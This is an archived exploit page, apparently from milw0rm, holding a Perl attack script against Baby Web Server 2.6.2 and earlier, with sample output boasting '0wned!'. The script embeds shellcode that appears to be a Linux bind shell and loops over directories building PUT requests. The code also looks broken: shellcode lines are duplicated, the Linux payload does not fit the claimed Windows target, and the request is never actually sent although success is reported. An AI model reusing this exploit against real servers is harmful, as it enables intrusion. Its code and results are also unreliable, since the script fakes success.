<html><head><title>Baby Web Server <= 2.6.2 Command Validation Exploit</title></head><pre>#!/bin/perl
#
#     Baby Web Server Command Validation Exploit
# --------------------------------------------------
#        Infam0us Gr0up - Securiti Research
#
#
# E:\&gt;nc -v localhost 80
# Infam0us-Gr0up [127.0.0.1] 80 (http) open
# GET HTTP
#
# HTTP/1.0 400 Bad Request
# Server: Baby Web Server &lt; --
# Set-Cookie: SESSIONID=00000001; path=/;version=1
# Last-Modified: Tue, 12 Jul 2005 06:43:05 GMT
#
#
# E:\PERL&gt;perl babyws.pl localhost test.txt E:\Website\www04\ad\index.html
#
# [+] Connecting to localhost..
# [+] Connected
# [+] Create Spl0it..
# [+] Sending Command Validation..
# [+] Now attacking..
# [+] Domain: localhost
# [+] Path:E: E:\Website\www04\ad\index.html
# [+] 0wned!
#
# Tested on Windows2000 SP4 (Win NT)
# Info : basher13@linuxmail.org / infamous.2hell.com
# Vendor URL: http://www.pablosoftwaresolutions.com/


use IO::Socket;
if(@ARGV!=3){
print &quot;    Baby Web Server Command Validation Exploit \n&quot;;
print &quot;----------------------------------------------------\n&quot;;
print &quot;     Infam0us Gr0up - Securiti Research\n\n&quot;;
print &quot;[-]Usage: babyws.pl [target] [input] [path_file]\n&quot;;
print &quot;[?]Exam:  babyws.pl localhost test.txt e:\www\site01\default.htm\n\n&quot;;
exit(1);
}

$site = $ARGV[0];

my $infile = $ARGV[1];
my $path = $ARGV[2];

print &quot;\n\n&quot;;
print &quot;[+] Connecting to $site..\n&quot;;

$sock = IO::Socket::INET-&gt;new(
PeerAddr =&gt; &quot;$ARGV[0]&quot;,
PeerPort =&gt; 80,
Proto =&gt; &quot;tcp&quot;)
or die &quot;Unable to connect&quot;;

print &quot;[+] Connected\n&quot;;
print &quot;[+] Create Spl0it..\n&quot;;

$sploit =
&quot;\xeb\x6e\x5e\x29\xc0\x89\x46\x10&quot;.
&quot;\x40\x89\xc3\x89\x46\x0c\x40\x89&quot;.
&quot;\x46\x08\x8d\x4e\x08\xb0\x66\xcd&quot;.
&quot;\x40\x89\xc3\x89\x46\x0c\x40\x89&quot;.
&quot;\x46\x08\x8d\x4e\x08\xb0\x66\xcd&quot;.
&quot;\x80\x43\xc6\x46\x10\x10\x88\x46&quot;.
&quot;\x08\x31\xc0\x31\xd2\x89\x46\x18&quot;.
&quot;\xb0\x90\x66\x89\x46\x16\x8d\x4e&quot;.
&quot;\x14\x89\x4e\x0c\x8d\x4e\x08\xb0&quot;.
&quot;\x66\xcd\x80\x89\x5e\x0c\x43\x43&quot;.
&quot;\xb0\x66\xcd\x80\x89\x56\x0c\x89&quot;.
&quot;\x08\x31\xc0\x31\xd2\x89\x46\x18&quot;.
&quot;\xb0\x90\x66\x89\x46\x16\x8d\x4e&quot;.
&quot;\x14\x89\x4e\x0c\x8d\x4e\x08\xb0&quot;.
&quot;\x56\x10\xb0\x66\x43\xcd\x80\x86&quot;.
&quot;\xc3\xb0\x3f\x29\xc9\xcd\x80\xb0&quot;.
&quot;\x14\x89\x4e\x0c\x8d\x4e\x08\xb0&quot;.
&quot;\x66\xcd\x80\x89\x5e\x0c\x43\x43&quot;.
&quot;\xb0\x66\xcd\x80\x89\x56\x0c\x89&quot;.
&quot;\x56\x10\xb0\x66\x43\xcd\x80\x86&quot;.
&quot;\xc3\xb0\x3f\x29\xc9\xcd\x80\xb0&quot;.
&quot;\x3f\x41\xcd\x80\xb0\x3f\x41\xcd&quot;.
&quot;\x80\x88\x56\x07\x89\x76\x0c\x87&quot;.
&quot;\xf3\x8d\x4b\x0c\xb0\x0b\xcd\x80&quot;.
&quot;\xe8\x8d\xff\xff&quot;;


print &quot;[+] Sending Command Validation..\n&quot;;
open(OUT, &quot;&gt;$path&quot;) or die(&quot;unable to open $path: $!&quot;);
open(IN, $infile) or die(&quot;unable to open $infile: $!&quot;);
@directories=&lt;IN&gt;;

$blah = &quot;GET $sploit HTTP/1.0\nHost: $site\nContent-length: 4\nTEST\n&quot;;

print &quot;[+] Now attacking..\n&quot;;

foreach (@directories) {
       chomp;
       print OUT &quot;$_ --&gt; &quot;;
       s/ /%20/g;
        my $repl = (qq(PUT /$_/test.txt $blah));

       if ($repl =~ /not allowed/i) { print OUT &quot;Not Allowed\n&quot;; }
       elsif ($repl =~ /403.4 Forbidden: SSL required/i) { print OUT &quot;* 403.4 Forbidden: SSL required *\n&quot;; }
       elsif ($repl =~ /401 Unauthorized/i) { print OUT &quot;401 Unauthorized\n&quot;; }
       elsif ($repl =~ /Error 404/i) { print OUT &quot;Error 404\n&quot;; }
       elsif ($repl =~ /Write Access Forbidden/i) { print OUT &quot;Write Access Forbidden\n&quot;; }
       elsif ($repl =~ /Unauthorized due to ACL on resource/i) { print OUT &quot;Unauthorized due to ACL on resource\n&quot;; }
       else { print OUT &quot;*** SUCCESSFULL PUT ***\n&quot;; }
}
close($sock);
print &quot;[+] Domain: $site\n&quot;;
print &quot;[+] Path: $ARGV[2]\n&quot;;
print &quot;[+] 0wned!\n&quot;;
exit();

# milw0rm.com [2005-07-11]</pre></html>